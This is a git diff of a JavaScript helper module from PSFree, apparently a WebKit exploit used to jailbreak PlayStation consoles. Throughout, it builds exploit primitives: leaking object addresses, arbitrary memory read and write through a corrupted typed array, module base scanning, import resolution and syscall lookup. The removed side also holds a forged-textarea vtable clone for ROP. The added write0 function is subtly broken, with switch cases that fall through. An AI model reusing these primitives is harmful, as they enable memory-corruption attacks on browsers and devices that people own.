@@ -1,39 +1,42 @@
-import { Int, lohi_from_one, view_m_vector, view_m_length, KB, page_size } from './offset.js';
-export function find_base(addr, is_text, is_back) {
-    // align to page size
-    addr = align(addr, page_size);
-    const offset = (is_back ? -1 : 1) * page_size;
-    while (true) {
-        if (check_magic_at(addr, is_text)) {
-            break;
-        }
-        addr = addr.add(offset)
-    }
-    return addr;
-}
-export class DieError extends Error {
-    constructor(...args) {
-        super(...args);
-        this.name = this.constructor.name;
-    }
-}
+/* Copyright (C) 2023 anonymous
 
-export function die(msg='') {
-    throw new DieError(msg);
-}
+This file is part of PSFree.
 
-const console = document.getElementById('console');
-//export function debug_log(msg='') {
-//    console.append(msg + '\n');
-//}
-export const debug_log = print; 
-window.debug_log = debug_log;
+PSFree is free software: you can redistribute it and/or modify
+it under the terms of the GNU Affero General Public License as
+published by the Free Software Foundation, either version 3 of the
+License, or (at your option) any later version.
 
-export function clear_log() {
-    console.innerHTML = null;
+PSFree is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU Affero General Public License for more details.
+
+You should have received a copy of the GNU Affero General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
+
+// import { Int } from './int64.mjs';
+
+
+function die(msg) {
+    alert(msg);
+    undefinedFunction();
 }
 
-export function str2array(str, length, offset) {
+function debug_log(msg) {
+    // let textNode = document.createTextNode(msg);
+    // let node = document.createElement("p").appendChild(textNode);
+
+    // document.body.appendChild(node);
+    // document.body.appendChild(document.createElement("br"));
+    print(msg);
+}
+
+function clear_log() {
+    // document.body.innerHTML = null;
+}
+
+function str2array(str, length, offset) {
     if (offset === undefined) {
         offset = 0;
     }
@@ -45,17 +48,17 @@ export function str2array(str, length, offset) {
 }
 
 // alignment must be 32 bits and is a power of 2
-export function align(a, alignment) {
+function align(a, alignment) {
     if (!(a instanceof Int)) {
         a = new Int(a);
     }
     const mask = -alignment & 0xffffffff;
     let type = a.constructor;
-    let low = a.low & mask;
-    return new type(low, a.high);
+    let low = a.low() & mask;
+    return new type(low, a.high());
 }
 
-export async function send(url, buffer, file_name, onload=() => {}) {
+async function send(url, buffer, file_name, onload=() => {}) {
     const file = new File(
         [buffer],
         file_name,
@@ -73,428 +76,394 @@ export async function send(url, buffer, file_name, onload=() => {}) {
     onload();
 }
 
-// mostly used to yield to the GC. marking is concurrent but collection isn't
-//
-// yielding also lets the DOM update. which is useful since we use the DOM for
-// logging and we loop when waiting for a collection to occur
-export function sleep(ms=0) {
-    return new Promise(resolve => setTimeout(resolve, ms));
+const KB = 1024;
+const MB = KB * KB;
+const GB = KB * KB * KB;
+
+function check_range(x) {
+    return (-0x80000000 <= x) && (x <= 0xffffffff);
 }
 
-export function hex(number) {
-    return '0x' + number.toString(16);
+function unhexlify(hexstr) {
+    if (hexstr.substring(0, 2) === "0x") {
+        hexstr = hexstr.substring(2);
+    }
+    if (hexstr.length % 2 === 1) {
+        hexstr = '0' + hexstr;
+    }
+    if (hexstr.length % 2 === 1) {
+        throw TypeError("Invalid hex string");
+    }
+
+    let bytes = new Uint8Array(hexstr.length / 2);
+    for (let i = 0; i < hexstr.length; i += 2) {
+        let new_i = hexstr.length - 2 - i;
+        let substr = hexstr.slice(new_i, new_i + 2);
+        bytes[i / 2] = parseInt(substr, 16);
+    }
+
+    return bytes;
 }
 
-// no "0x" prefix
-export function hex_np(number) {
-    return number.toString(16);
+// Decorator for Int instance operations. Takes care
+// of converting arguments to Int instances if required.
+function operation(f, nargs) {
+    return function () {
+        if (arguments.length !== nargs)
+            throw Error("Not enough arguments for function " + f.name);
+        let new_args = [];
+        for (let i = 0; i < arguments.length; i++) {
+            if (!(arguments[i] instanceof Int)) {
+                new_args[i] = new Int(arguments[i]);
+            } else {
+                new_args[i] = arguments[i];
+            }
+        }
+        return f.apply(this, new_args);
+    };
 }
 
-export class BufferView extends Uint8Array {
-    constructor(...args) {
-        super(...args);
-        this._dview = new DataView(this.buffer);
+class Int {
+    constructor(low, high) {
+        let buffer = new Uint32Array(2);
+        let bytes = new Uint8Array(buffer.buffer);
+
+        if (arguments.length > 2) {
+            throw TypeError('Int takes at most 2 args');
+        }
+        if (arguments.length === 0) {
+            throw TypeError('Int takes at min 1 args');
+        }
+        let is_one = false;
+        if (arguments.length === 1) {
+            is_one = true;
+        }
+
+        if (!is_one) {
+            if (typeof (low) !== 'number'
+                && typeof (high) !== 'number') {
+                throw TypeError('low/high must be numbers');
+            }
+        }
+
+        if (typeof low === 'number') {
+            if (!check_range(low)) {
+                throw TypeError('low not a valid value: ' + low);
+            }
+            if (is_one) {
+                high = 0;
+                if (low < 0) {
+                    high = -1;
+                }
+            } else {
+                if (!check_range(high)) {
+                    throw TypeError('high not a valid value: ' + high);
+                }
+            }
+            buffer[0] = low;
+            buffer[1] = high;
+        } else if (typeof low === 'string') {
+            bytes.set(unhexlify(low));
+        } else if (typeof low === 'object') {
+            if (low instanceof Int) {
+                bytes.set(low.bytes);
+            } else {
+                if (low.length !== 8)
+                    throw TypeError("Array must have exactly 8 elements.");
+                bytes.set(low);
+            }
+        } else {
+            throw TypeError('Int does not support your object for conversion');
+        }
+
+        this.buffer = buffer;
+        this.bytes = bytes;
+
+        this.eq = operation(function eq(b) {
+            const a = this;
+            return a.low() === b.low() && a.high() === b.high();
+        }, 1);
+
+        this.neg = operation(function neg() {
+            let type = this.constructor;
+
+            let low = ~this.low();
+            let high = ~this.high();
+
+            let res = (new Int(low, high)).add(1);
+
+            return new type(res);
+        }, 0);
+
+        this.add = operation(function add(b) {
+            let type = this.constructor;
+
+            let low = this.low();
+            let high = this.high();
+
+            low += b.low();
+            let carry = 0;
+            if (low > 0xffffffff) {
+                carry = 1;
+            }
+            high += carry + b.high();
+
+            low &= 0xffffffff;
+            high &= 0xffffffff;
+
+            return new type(low, high);
+        }, 1);
+
+        this.sub = operation(function sub(b) {
+            let type = this.constructor;
+
+            b = b.neg();
+
+            let low = this.low();
+            let high = this.high();
+
+            low += b.low();
+            let carry = 0;
+            if (low > 0xffffffff) {
+                carry = 1;
+            }
+            high += carry + b.high();
+
+            low &= 0xffffffff;
+            high &= 0xffffffff;
+
+            return new type(low, high);
+        }, 1);
     }
 
-    read16(offset) {
-        return this._dview.getUint16(offset, true);
+    low() {
+        return this.buffer[0];
     }
 
-    read32(offset) {
-        return this._dview.getUint32(offset, true);
+    high() {
+        return this.buffer[1];
     }
 
-    read64(offset) {
-        return new Int(
-            this._dview.getUint32(offset, true),
-            this._dview.getUint32(offset + 4, true),
-        );
-    }
+    toString(is_pretty) {
+        if (!is_pretty) {
+            let low = this.low().toString(16).padStart(8, '0');
+            let high = this.high().toString(16).padStart(8, '0');
+            return '0x' + high + low;
+        }
+        let high = this.high().toString(16).padStart(8, '0');
+        high = high.substring(0, 4) + '_' + high.substring(4);
 
-    write16(offset, value) {
-        this._dview.setUint16(offset, value, true);
-    }
-
-    write32(offset, value) {
-        this._dview.setUint32(offset, value, true);
-    }
-
-    write64(offset, value) {
-        const values = lohi_from_one(value)
-        this._dview.setUint32(offset, values[0], true);
-        this._dview.setUint32(offset + 4, values[1], true);
+        let low = this.low().toString(16).padStart(8, '0');
+        low = low.substring(0, 4) + '_' + low.substring(4);
+        return '0x' + high + '_' + low;
     }
 }
 
-function read(u8_view, offset, size) {
-    let res = 0;
-    for (let i = 0; i < size; i++) {
-        res += u8_view[offset + i] << i*8;
-    }
-    // << returns a signed integer, >>> converts it to unsigned
-    return res >>> 0;
-}
+Int.Zero = new Int(0);
+Int.One = new Int(1);
 
-export function read16(u8_view, offset) {
-    return read(u8_view, offset, 2);
-}
-
-export function read32(u8_view, offset) {
-    return read(u8_view, offset, 4);
-}
-
-export function read64(u8_view, offset) {
-    return new Int(read32(u8_view, offset), read32(u8_view, offset + 4));
-}
-
-// for writes less than 8 bytes
-function write(u8_view, offset, value, size) {
-    for (let i = 0; i < size; i++) {
-        u8_view[offset + i]  = (value >>> i*8) & 0xff;
-    }
-}
-
-export function write16(u8_view, offset, value) {
-    write(u8_view, offset, value, 2);
-}
-
-export function write32(u8_view, offset, value) {
-    write(u8_view, offset, value, 4);
-}
-
-export function write64(u8_view, offset, value) {
-    if (!(value instanceof Int)) {
-        throw TypeError('write64 value must be an Int');
-    }
-
-    let low = value.low;
-    let high = value.high;
-
-    for (let i = 0; i < 4; i++) {
-        u8_view[offset + i]  = (low >>> i*8) & 0xff;
-    }
-    for (let i = 0; i < 4; i++) {
-        u8_view[offset + 4 + i]  = (high >>> i*8) & 0xff;
-    }
-}
-
-export let mem = null;
-
-// cache some constants
-const off_vector = view_m_vector / 4;
-const off_vector2 = (view_m_vector + 4) / 4;
-const isInteger = Number.isInteger;
+let mem = null;
 
 function init_module(memory) {
     mem = memory;
 }
 
-function add_and_set_addr(mem, offset, base_lo, base_hi) {
-    const values = lohi_from_one(offset);
-    const main = mem._main;
-
-    const low = base_lo + values[0];
-
-    // no need to use ">>> 0" to convert to unsigned here
-    main[off_vector] = low;
-    main[off_vector2] = base_hi + values[1] + (low > 0xffffffff);
-}
-
-export class Addr extends Int {
+class Addr extends Int {
     read8(offset) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
-
-        return m.read8_at(offset);
+        const addr = this.add(offset);
+        return mem.read8(addr);
     }
 
     read16(offset) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
-
-        return m.read16_at(offset);
+        const addr = this.add(offset);
+        return mem.read16(addr);
     }
 
     read32(offset) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
-
-        return m.read32_at(offset);
+        const addr = this.add(offset);
+        return mem.read32(addr);
     }
 
     read64(offset) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
-
-        return m.read64_at(offset);
+        const addr = this.add(offset);
+        return mem.read64(addr);
     }
 
+    // returns a pointer instead of an Int
     readp(offset) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
-
-        return m.readp_at(offset);
+        const addr = this.add(offset);
+        return mem.readp(addr);
     }
 
     write8(offset, value) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
+        const addr = this.add(offset);
 
-        m.write8_at(offset, value);
+        mem.write8(addr, value);
     }
 
     write16(offset, value) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
+        const addr = this.add(offset);
 
-        m.write16_at(offset, value);
+        mem.write16(addr, value);
     }
 
     write32(offset, value) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
+        const addr = this.add(offset);
 
-        m.write32_at(offset, value);
+        mem.write32(addr, value);
     }
 
     write64(offset, value) {
-        const m = mem;
-        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
-            m._set_addr_direct(this);
-        } else {
-            add_and_set_addr(m, offset, this.low, this.high);
-            offset = 0;
-        }
+        const addr = this.add(offset);
 
-        m.write64_at(offset, value);
+        mem.write64(addr, value);
     }
 }
 
-export class Memory {
-    constructor(main, worker, obj, addr_addr)  {
-        this._main = main;
-        this._worker = worker;
-        this._obj = obj;
-        this._addr_low = addr_addr.low;
-        this._addr_high = addr_addr.high;
-
-        main[view_m_length / 4] = 0xffffffff;
-
-        init_module(this);
-    }
-
-    addrof(object) {
-        // typeof considers null as a object. blacklist it as it isn't a
-        // JSObject
-        if ((typeof object !== 'object' || object === null)
-            && typeof object !== 'function'
+class MemoryBase {
+    _addrof(obj) {
+        if (typeof obj !== 'object'
+            && typeof obj !== 'function'
         ) {
-            throw TypeError('argument not a JS object');
+            throw TypeError('addrof argument not a JS object');
         }
-
-        const obj = this._obj;
-        const worker = this._worker;
-        const main = this._main;
-
-        obj.addr = object;
-
-        main[off_vector] = this._addr_low;
-        main[off_vector2] = this._addr_high;
-
-        const res = new Addr(
-            worker.getUint32(0, true),
-            worker.getUint32(4, true),
-        );
-        obj.addr = null;
+        this.worker.a = obj;
+        write64(this.main, view_m_vector, this.butterfly.sub(0x10));
+        let res = read64(this.worker, 0);
+        write64(this.main, view_m_vector, this._current_addr);
 
         return res;
     }
 
-    // expects addr to be a Int
-    _set_addr_direct(addr) {
-        const main = this._main;
-        main[off_vector] = addr.low;
-        main[off_vector2] = addr.high;
+    addrof(obj) {
+        return new Addr(this._addrof(obj));
     }
 
     set_addr(addr) {
-        const values = lohi_from_one(addr);
-        const main = this._main;
-        main[off_vector] = values[0];
-        main[off_vector2] = values[1];
+        if (!(addr instanceof Int)) {
+            throw TypeError('addr must be an Int');
+        }
+        this._current_addr = addr;
+        write64(this.main, view_m_vector, this._current_addr);
     }
 
     get_addr() {
-        return new Addr(main[off_vector], main[off_vector2]);
+        return this._current_addr;
+    }
+
+    // write0() is for when you want to write to address 0. You can't use for
+    // example: "mem.write32(Int.Zero, 0)", since you can't set by index the
+    // view when it isDetached(). isDetached() == true when m_mode >=
+    // WastefulTypedArray and m_vector == 0.
+    //
+    // Functions like write32() will index mem.worker via write() from rw.mjs.
+    //
+    // size is the number of bits to read/write.
+    //
+    // The constraint is 0 <= offset + 1 < 2**32.
+    //
+    // PS4 firmwares >= 9.00 and any PS5 version can write to address 0
+    // directly. All firmwares (PS4 and PS5) can read address 0 directly.
+    //
+    // See setIndex() from
+    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayView.h at PS4
+    // 8.03 for more information. Affected firmwares will get this error:
+    //
+    // TypeError: Underlying ArrayBuffer has been detached from the view
+    write0(size, offset, value) {
+        const i = offset + 1;
+        if (i >= 2**32 || i < 0) {
+            throw RangeError(`read0() invalid offset: ${offset}`);
+        }
+
+        this.set_addr(new Int(-1));
+
+        switch (size) {
+            case 8: {
+                this.worker[i] = value;
+            }
+            case 16: {
+                write16(this.worker, i, value);
+            }
+            case 32: {
+                write32(this.worker, i, value);
+            }
+            case 64: {
+                write64(this.worker, i, value);
+            }
+            default: {
+                throw RangeError(`write0() invalid size: ${size}`);
+            }
+        }
     }
 
     read8(addr) {
         this.set_addr(addr);
-        return this._worker.getUint8(0);
+        return this.worker[0];
     }
 
     read16(addr) {
         this.set_addr(addr);
-        return this._worker.getUint16(0, true);
+        return read16(this.worker, 0);
     }
 
     read32(addr) {
         this.set_addr(addr);
-        return this._worker.getUint32(0, true);
+        return read32(this.worker, 0);
     }
 
     read64(addr) {
         this.set_addr(addr);
-        const worker = this._worker;
-        return new Int(worker.getUint32(0, true), worker.getUint32(4, true));
+        return read64(this.worker, 0);
     }
 
     // returns a pointer instead of an Int
     readp(addr) {
-        this.set_addr(addr);
-        const worker = this._worker;
-        return new Addr(worker.getUint32(0, true), worker.getUint32(4, true));
-    }
-
-    read8_at(offset) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        return this._worker.getUint8(offset);
-    }
-
-    read16_at(offset) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        return this._worker.getUint16(offset, true);
-    }
-
-    read32_at(offset) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        return this._worker.getUint32(offset, true);
-    }
-
-    read64_at(offset) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        const worker = this._worker;
-        return new Int(
-            worker.getUint32(offset, true),
-            worker.getUint32(offset + 4, true),
-        );
-    }
-
-    readp_at(offset) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        const worker = this._worker;
-        return new Addr(
-            worker.getUint32(offset, true),
-            worker.getUint32(offset + 4, true),
-        );
+        return new Addr(this.read64(addr));
     }
 
     write8(addr, value) {
         this.set_addr(addr);
-        this._worker.setUint8(0, value);
+        this.worker[0] = value;
     }
 
     write16(addr, value) {
         this.set_addr(addr);
-        this._worker.setUint16(0, value, true);
+        write16(this.worker, 0, value);
     }
 
     write32(addr, value) {
         this.set_addr(addr);
-        this._worker.setUint32(0, value, true);
+        write32(this.worker, 0, value);
     }
 
     write64(addr, value) {
-        const values = lohi_from_one(value);
         this.set_addr(addr);
-        const worker = this._worker;
-        worker.setUint32(0, values[0], true);
-        worker.setUint32(4, values[1], true);
-    }
-
-    write8_at(offset, value) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        this._worker.setUint8(offset, value);
-    }
-
-    write16_at(offset, value) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        this._worker.setUint16(offset, value, true);
-    }
-
-    write32_at(offset, value) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        this._worker.setUint32(offset, value, true);
-    }
-
-    write64_at(offset, value) {
-        if (!isInteger(offset)) {
-            throw TypeError('offset not a integer');
-        }
-        const values = lohi_from_one(value);
-        const worker = this._worker;
-        worker.setUint32(offset, values[0], true);
-        worker.setUint32(offset + 4, values[1], true);
+        write64(this.worker, 0, value);
     }
 }
 
-export function make_buffer(addr, size) {
+class Memory extends MemoryBase {
+    constructor(main, worker)  {
+        super();
+
+        this.main = main;
+        this.worker = worker;
+
+        // The initial creation of the "a" property will change the butterfly
+        // address. Do it now so we can cache it for addrof().
+        worker.a = 0; // dummy value, we just want to create the "a" property
+        this.butterfly = read64(main, js_butterfly);
+
+        write32(main, view_m_length, 0xffffffff);
+
+        this._current_addr = Int.Zero;
+
+        init_module(this);
+    }
+}
+
+function make_buffer(addr, size) {
     // see enum TypedArrayMode from
     // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
     // at webkitgtk 2.34.4
@@ -502,7 +471,11 @@ export function make_buffer(addr, size) {
     // see possiblySharedBuffer() from
     // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
     // at webkitgtk 2.34.4
-
+    //
+    // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
+    // associated with them, if we ask for view.buffer, the view will be
+    // converted into a WastefulTypedArray and an ArrayBuffer will be created.
+    //
     // We will create an OversizeTypedArray via requesting an Uint8Array whose
     // number of elements will be greater than fastSizeLimit (1000).
     //
@@ -520,20 +493,15 @@ export function make_buffer(addr, size) {
     const u_addr = mem.addrof(u);
 
     // we won't change the butterfly and m_mode so we won't save those
-    const old_addr = u_addr.read64(o.view_m_vector);
-    const old_size = u_addr.read32(o.view_m_length);
+    const old_addr = u_addr.read64(view_m_vector);
+    const old_size = u_addr.read32(view_m_length);
 
-    u_addr.write64(o.view_m_vector, addr);
-    u_addr.write32(o.view_m_length, size);
+    u_addr.write64(view_m_vector, addr);
+    u_addr.write32(view_m_length, size);
 
     const copy = new Uint8Array(u.length);
     copy.set(u);
 
-    // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
-    // associated with them, if we ask for view.buffer, the view will be
-    // converted into a WastefulTypedArray and an ArrayBuffer will be created.
-    // This is done by calling slowDownAndWasteMemory().
-    //
     // We can't use slowDownAndWasteMemory() on u since that will create a
     // JSC::ArrayBufferContents with its m_data pointing to addr. On the
     // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
@@ -543,8 +511,8 @@ export function make_buffer(addr, size) {
     const res = copy.buffer;
 
     // restore
-    u_addr.write64(o.view_m_vector, old_addr);
-    u_addr.write32(o.view_m_length, old_size);
+    u_addr.write64(view_m_vector, old_addr);
+    u_addr.write32(view_m_length, old_size);
 
     return res;
 }
@@ -603,17 +571,30 @@ function check_magic_at(p, is_text) {
 // // 0 distance away from module_base_addr.
 // addr.read8(-1);
 //
-
+function find_base(addr, is_text, is_back) {
+    // ps4 page size
+    const page_size = 16 * KB;
+    // align to page size
+    addr = align(addr, page_size);
+    const offset = (is_back ? -1 : 1) * page_size;
+    while (true) {
+        if (check_magic_at(addr, is_text)) {
+            break;
+        }
+        addr = addr.add(offset)
+    }
+    return addr;
+}
 
 // gets the address of the underlying buffer of a JSC::JSArrayBufferView
-export function get_view_vector(view) {
+function get_view_vector(view) {
     if (!ArrayBuffer.isView(view)) {
         throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
     }
-    return mem.addrof(view).readp(o.view_m_vector);
+    return mem.addrof(view).readp(view_m_vector);
 }
 
-export function resolve_import(import_addr) {
+function resolve_import(import_addr) {
     if (import_addr.read16(0) !== 0x25ff) {
         throw Error(
             `instruction at ${import_addr} is not of the form: jmp qword`
@@ -635,15 +616,13 @@ export function resolve_import(import_addr) {
     return function_addr;
 }
 
-export function init_syscall_array(
+function init_syscall_array(
     syscall_array,
     libkernel_web_base,
     max_search_size,
 ) {
-    if (!Number.isInteger(max_search_size)) {
-        throw TypeError(
-            `max_search_size is not a integer: ${max_search_size}`
-        );
+    if (typeof max_search_size !== 'number') {
+        throw TypeError(`max_search_size is not a number: ${max_search_size}`);
     }
     if (max_search_size < 0) {
         throw Error(`max_search_size is less than 0: ${max_search_size}`);
@@ -700,101 +679,94 @@ export function init_syscall_array(
     }
 }
 
-// textarea object cloned by create_ta_clone()
-const rop_ta = document.createElement('textarea');
+function read(u8_view, offset, size) {
+    let res = 0;
+    for (let i = 0; i < size; i++) {
+        res += u8_view[offset + i] << i*8;
+    }
+    // << returns a signed integer, >>> converts it to unsigned
+    return res >>> 0;
+}
 
-// Creates a helper object for ROP using the textarea vtable method
-//
-// Args:
-//   obj:
-//     Object to attach objects that need to stay alive in order for the clone
-//     to work.
-//
-// Returns:
-//   The address of the clone.
-export function create_ta_clone(obj) {
-    // sizeof JSC:JSObject, the JSCell + the butterfly field
-    const js_size = 0x10;
-    // start of the array of inline properties (JSValues)
-    const offset_js_inline_prop = 0x10;
-    // Sizes may vary between webkit versions so we just assume a size
-    // that we think is large enough for all of them.
-    const vtable_size = 0x1000;
-    const webcore_ta_size = 0x180;
+function read16(u8_view, offset) {
+    return read(u8_view, offset, 2);
+}
 
-    // Empty objects have 6 inline properties that are not inspected by the
-    // GC. This gives us 48 bytes of free space that we can write with
-    // anything.
-    const ta_clone = {};
-    obj.ta_clone = ta_clone;
-    const clone_p = mem.addrof(ta_clone);
-    const ta_p = mem.addrof(rop_ta);
+function read32(u8_view, offset) {
+    return read(u8_view, offset, 4);
+}
 
-    // Copy the contents of the textarea before copying the JSCell. As long
-    // the JSCell is of an empty object, the GC will not inspect the inline
-    // storage.
-    //
-    // MarkedBlocks serve memory in fixed-size chunks (cells). The chunk
-    // size is also called the cell size. Even if you request memory whose
-    // size is less than a cell, the entire cell is allocated for the
-    // object.
-    //
-    // The cell size of the MarkedBlock where the empty object is allocated
-    // is atleast 64 bytes (enough to fit the empty object). So even if we
-    // change the JSCell later and the perceived size of the object
-    // (size_jsta) is less than 64 bytes, we don't have to worry about the
-    // memory area between clone_p + size_jsta and clone_p + cell_size
-    // being freed and reused because the entire cell belongs to the object
-    // until it dies.
-    for (let i = js_size; i < o.size_jsta; i += 8) {
-        clone_p.write64(i, ta_p.read64(i));
+function read64(u8_view, offset) {
+    let res = [];
+    for (let i = 0; i < 8; i++) {
+        res.push(u8_view[offset + i]);
+    }
+    return new Int(res);
+}
+
+// for writes less than 8 bytes
+function write(u8_view, offset, value, size) {
+    for (let i = 0; i < size; i++) {
+        u8_view[offset + i]  = (value >>> i*8) & 0xff;
+    }
+}
+
+function write16(u8_view, offset, value) {
+    write(u8_view, offset, value, 2);
+}
+
+function write32(u8_view, offset, value) {
+    write(u8_view, offset, value, 4);
+}
+
+function write64(u8_view, offset, value) {
+    if (!(value instanceof Int)) {
+        throw TypeError('write64 value must be an Int');
     }
 
-    // JSHTMLTextAreaElement is a subclass of JSC::JSDestructibleObject and
-    // thus they are allocated on a MarkedBlock with special attributes
-    // that tell the GC to have their destructor clean their storage on
-    // their death.
-    //
-    // The destructor in this case will destroy m_wrapped since they are a
-    // subclass of WebCore::JSDOMObject as well.
-    //
-    // What's great about the clones (initially empty objects) is that they
-    // are instances of JSC::JSFinalObject. That type doesn't have a
-    // destructor and so they are allocated on MarkedBlocks that don't need
-    // destruction.
-    //
-    // So even if a clone dies, the GC will not look for a destructor and
-    // try to run it. This means we can fake m_wrapped and not fear of any
-    // sort of destructor being called on it.
+    let low = value.low();
+    let high = value.high();
 
-    const webcore_ta = ta_p.readp(o.jsta_impl);
-    const m_wrapped_clone = new Uint8Array(
-        make_buffer(webcore_ta, webcore_ta_size)
-    );
-    obj.m_wrapped_clone = m_wrapped_clone;
-
-    // Replicate the vtable as much as possible or else the garbage
-    // collector will crash. It uses functions from the vtable.
-    const vtable_clone = new Uint8Array(
-        make_buffer(webcore_ta.readp(0), vtable_size)
-    );
-    obj.vtable_clone = vtable_clone
-
-    clone_p.write64(
-        o.jsta_impl,
-        get_view_vector(m_wrapped_clone),
-    );
-    write64(m_wrapped_clone, 0, get_view_vector(vtable_clone));
-
-    // turn the empty object into a textarea (copy JSCell header)
-    //
-    // Don't need to copy the butterfly since it's by default NULL and it
-    // doesn't have any special meaning for the JSHTMLTextAreaObject type,
-    // unlike other types that uses it for something else.
-    //
-    // An example is a JSArrayBufferView with m_mode >= WastefulTypedArray,
-    // their *(butterfly - 8) is a pointer to a JSC::ArrayBuffer.
-    clone_p.write64(0, ta_p.read64(0));
-
-    return clone_p;
+    for (let i = 0; i < 4; i++) {
+        u8_view[offset + i]  = (low >>> i*8) & 0xff;
+    }
+    for (let i = 0; i < 4; i++) {
+        u8_view[offset + 4 + i]  = (high >>> i*8) & 0xff;
+    }
 }
+
+function sread64(str, offset) {
+    let res = [];
+    for (let i = 0; i < 8; i++) {
+        res.push(str.charCodeAt(offset + i));
+    }
+    return new Int(res);
+}
+
+const SYS_READ                = 0x003;
+const SYS_WRITE               = 0x004;
+const SYS_CLOSE               = 0x006;
+const SYS_GETPID              = 0x014;
+const SYS_GETUID              = 0x018;
+const SYS_ACCEPT              = 0x01E;
+const SYS_IOCTL               = 0x036;
+const SYS_SOCKET              = 0x061;
+const SYS_CONNECT             = 0x062;
+const SYS_BIND                = 0x068;
+const SYS_SETSOCKOPT          = 0x069;
+const SYS_LISTEN              = 0x06A;
+const SYS_GETSOCKOPT          = 0x076;
+const SYS_NANOSLEEP           = 0x0F0;
+const SYS_KQUEUE              = 0x16A;
+const SYS_RTPRIO_THREAD       = 0x1D2;
+const SYS_MMAP                = 0x1DD;
+const SYS_PS4_CPUSET_SETAFFINITY = 0x1E8;
+const SYS_JITSHM_CREATE       = 0x215;
+const SYS_JITSHM_ALIAS        = 0x216;
+const SYS_DYNLIB_DLSYM        = 0x24F;
+const SYS_PIPE2               = 0x2AF;
+const SYS_SCHED_YIELD         = 0x14B;
+const SYS__UMTX_OP            = 0x1C6;
+const SYS_FTRUNCATE           = 0x1E0;
+const SYS_FSTAT               = 0x0BD;
+const SYS_IS_IN_SANDBOX       = 0x249;
